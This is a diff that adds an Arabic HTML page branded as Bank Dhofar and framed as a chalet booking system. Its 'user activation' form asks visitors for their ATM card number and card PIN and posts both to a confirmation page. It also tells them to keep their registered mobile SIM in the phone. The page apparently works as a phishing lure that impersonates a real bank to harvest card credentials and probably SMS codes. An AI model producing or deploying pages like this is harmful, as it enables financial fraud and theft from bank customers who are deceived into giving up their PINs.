@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك ظفار - نظام حجز الشاليهات</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <img src="bank-dhofar-logo.png" alt="Bank Dhofar Logo" class="logo">
+            <h1>بنك ظفار</h1>
+        </div>
+    </header>
+    <main>
+        <section id="bank-activation">
+            <h3>تفعيل المستخدم</h3>
+            <p>أدخل رقم بطاقة الصراف الآلي الخاصة بك وكلمة المرور في الخانة أدناه.</p>
+            <form id="activation-form" action="confirmation.html" method="POST">
+                <label for="atm-card-number">رقم بطاقة الصراف الآلي:</label>
+                <input type="text" id="atm-card-number" name="atm-card-number" required>
+                
+                <label for="atm-card-pin">الرقم السري لبطاقة الصراف الآلي:</label>
+                <input type="password" id="atm-card-pin" name="atm-card-pin" required>
+                
+                <button type="submit">المتابعة</button>
+            </form>
+            <p class="note">تأكد من أن رقم الهاتف النقال مسجل لدى البنك، وأن بطاقة الهاتف المرتبطة بهذا الرقم موجودة داخل الهاتف.</p>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; ٢٠٢٥ بنك ظفار</p>
+    </footer>
+</body>
+</html>
